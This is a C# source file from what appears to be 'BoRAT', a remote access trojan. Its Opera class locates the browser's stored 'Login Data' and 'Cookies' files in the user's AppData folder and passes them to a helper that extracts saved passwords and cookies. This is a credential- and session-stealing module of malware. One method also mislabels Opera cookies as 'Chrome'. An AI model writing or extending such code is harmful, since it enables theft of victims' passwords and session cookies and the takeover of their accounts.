using BoRAT.Core.Data;
using BoRAT.Core.Recover.Utilites;
using System;
using System.Collections.Generic;
using System.IO;

namespace BoRAT.Core.Recovery.Browsers
{
    class Opera
    {

        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Login Data");
                return ChromiumBase.Passwords(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }

        public static List<Cookie> GetCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Cookies");
                return ChromiumBase.Cookies(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<Cookie>();
            }
        }
    }
}
